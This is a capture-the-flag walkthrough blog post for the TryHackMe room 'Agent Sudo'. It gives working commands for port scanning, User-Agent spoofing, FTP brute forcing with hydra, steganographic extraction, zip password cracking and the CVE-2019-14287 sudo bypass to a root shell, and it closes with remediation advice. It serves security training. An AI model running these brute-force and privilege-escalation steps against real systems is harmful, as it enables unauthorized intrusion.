# Agent Sudo




{{< image src="./images/room_image.webp" >}}

> **You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.**

{{< admonition tldr "TL;DR" >}}

**Agent Sudo** is an easy-difficulty boot2root room on TryHackMe. The exploitation chain starts with web reconnaissance and discovering that custom HTTP `User-Agent` headers redirect to an internal page revealing an agent's username. Brute-forcing the FTP service yields credentials and two steganographic images containing embedded archives and messages. Extracting the hidden data via `binwalk` and `steghide` reveals SSH credentials for user `james` . Finally, analyzing sudo privileges reveals a misconfiguration exploitable via **CVE-2019-14287** ( `sudo -u#-1 /bin/bash` ), granting instant root privileges.

{{< /admonition >}}

## Reconnaissance

We begin by scanning the target machine for open ports and services using `nmap` .

```bash
nmap -p- -Pn -T4 --min-rate 5000 MACHINE_IP -oG all_ports.txt
```

```text
# Nmap 7.95 scan initiated Tue Oct 27 12:47:14 2026
Host: MACHINE_IP ()    Status: Up
Host: MACHINE_IP ()    Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
```

A more detailed service and script scan on the discovered ports:

```bash
nmap -sC -sV -p 21,22,80 MACHINE_IP
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We have three exposed services:

- **Port 21:** FTP ( `vsftpd 3.0.3` )
- **Port 22:** SSH ( `OpenSSH 7.6p1` )
- **Port 80:** HTTP ( `Apache 2.4.29` )

---

## Web Enumeration & User-Agent Spoofing

Visiting the HTTP web server on port `80` reveals an announcement directed to secret agents:

> **Announcement: Secret Agents**  
> To all secret agents, please use your own codename (a single letter, e.g., C, R, J) as your User-Agent to access internal portal directives.

This suggests that the web application checks incoming `User-Agent` headers for authorization.

We can test different agent codenames using `curl` :

```bash
curl -i -A "C" http://MACHINE_IP/
```

```http
HTTP/1.1 302 Found
Date: Tue, 27 Oct 2026 12:52:00 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: /agent_C_attention.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The server returns a `302 Found` redirect to `/agent_C_attention.php` . Following the redirect:

```bash
curl -sL -A "C" http://MACHINE_IP/
```

The page contains the following directive:

> **Attention Agent C!**  
> Chris, you are the only agent who has not updated your password. Please change your weak password on the FTP server immediately.

This gives us two critical pieces of information:
- The username for Agent C is ** `chris` **.
- An FTP service is active with weak credentials.

---

## FTP Brute Force

With the username `chris` identified and port `21` open, we can use `hydra` with the `rockyou.txt` wordlist to brute-force the FTP password:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP
```

```text
[21][ftp] host: MACHINE_IP   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
```

We obtain the credentials:

| Services | Username | Password |
| :--- | :--- | :--- |
| **FTP** | `chris` | `crystal` |

{.table-responsive}

Connecting to the FTP server with the recovered credentials:

```bash
ftp MACHINE_IP
```

```text
Connected to MACHINE_IP.
220 (vsFTPd 3.0.3)
Name (MACHINE_IP:spawn2pwn): chris
331 Please specify the password.
Password: crystal
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||40123|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 1000     1000        34842 Oct 29  2019 cutie.png
-rw-r--r--    1 1000     1000          217 Oct 29  2019 To_agentJ.txt
226 Directory send OK.
ftp> prompt off
ftp> mget *
ftp> exit
```

We download three files from the FTP server:
1. `To_agentJ.txt` 2. `cutie.png` 3. `cute-alien.jpg` ---

## Steganography & Hash Cracking

Let us first examine the text note:

```bash
cat To_agentJ.txt
```

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

The note tells us that login credentials for **Agent J** are stored inside one of the images.

### Extracting Data from `cutie.png`

{{< image src="./images/cutie.webp" >}}

Running `binwalk` against `cutie.png` reveals an embedded Zip archive:

```bash
binwalk cutie.png
```

```text
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
8702          0x220E          Zip archive data, at offset 8702
```

We extract the embedded files using `binwalk -e` :

```bash
binwalk -e cutie.png
cd _cutie.png.extracted
ls -la
```

The extracted archive `8702.zip` is password-protected. We converted it to a readable format by John the Ripper and cracked it:

```bash
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
Loaded 1 password hash (PKZIP [32/64])
alien            (8702.zip)
1g 0:00:00:00 DONE (2026-10-27 13:01) 20.00g/s 204800p/s 204800c/s 204800C/s alien
```

The password for the zip file is ** `alien` **.

Extracting the contents with `7z` :

```bash
7z x 8702.zip -palien
cat To_agentR.txt
```

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

The message contains a Base64-encoded string: `QXJlYTUx` . Decoding it gives:

```bash
echo 'QXJlYTUx' | base64 -d
```

```text
Area51
```

### Extracting Data from `cute-alien.jpg`

{{< image src="./images/cute-alien.webp" >}}

Now that we have the passphrase ** `Area51` **, we can extract the hidden content embedded in `cute-alien.jpg` using `stegseek` (or `steghide` ):

```bash
steghide extract -sf cute-alien.jpg -p Area51
```

```text
wrote extracted data to "message.txt".
```

Checking the extracted text:

```bash
cat message.txt
```

```text
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We now have valid SSH credentials for user `james` :

| Fields | Value |
| :--- | :--- |
| **Username** | `james` |
| **Password** | `hackerrules!` |

{.table-responsive}

---

## Initial Foothold (SSH)

We connect to the machine via SSH as `james` :

```bash
ssh james@MACHINE_IP
```

```text
james@MACHINE_IP's password: hackerrules!
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)
james@agent-sudo:~$ whoami
james
```

We can now read the user flag located in the home directory:

```bash
cat /home/james/user.txt
```

---

## Privilege Escalation (CVE-2019-14287)

To identify paths for privilege escalation, we inspect the user's sudo permissions:

```bash
sudo -l
```

```text
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

The entry `(ALL, !root) /bin/bash` is configured to allow `james` to run `/bin/bash` as any user on the system **except** root.

However, older versions of sudo (specifically `< 1.8.28` ) are vulnerable to **CVE-2019-14287** (Sudo User ID Bypass).

### Vulnerability Mechanism

When `sudo` is invoked with the `-u` flag, it converts the provided user identifier to an integer via `setresuid()` or `setreuid()` .

If an attacker specifies user ID `-1` (or its unsigned equivalent `4294967295` ), the system function interprets `-1` as an instruction not to change the user ID. Because the command is already being spawned from the privileged sudo wrapper, the process executes with effective UID `0` (root), cleanly bypassing the `!root` blacklist check.

We can exploit this by running:

```bash
sudo -u#-1 /bin/bash
```

```text
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We instantly obtain an interactive root shell.

We can now capture the root flag:

```bash
cat /root/root.txt
```

---

## Conclusion

Agent Sudo provides a clear demonstration of how multiple minor weaknesses combine into a complete compromise:

1. **Information Disclosure via Headers:** Trusting client-supplied `User-Agent` values exposed internal usernames and service roles.
2. **Weak Service Passwords:** Using easily guessable passwords on exposed management services (FTP) enabled immediate unauthorized access.
3. **Insecure Data Storage:** Embedding plaintext credentials within Steganographic images and easily crackable ZIP archives provided false security.
4. **Outdated Sudo Binaries:** Relying on negative permission lists ( `!root` ) in `sudoers` without patching against known parser vulnerabilities (**CVE-2019-14287**) led directly to arbitrary root code execution.

**Remediation:**
- Ensure strong, complex passwords across all services.
- Avoid relying on client-controlled HTTP headers for application routing or authentication.
- Keep system binaries up to date; update `sudo` to version `1.8.28` or newer to mitigate CVE-2019-14287.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/agent-sudo/  

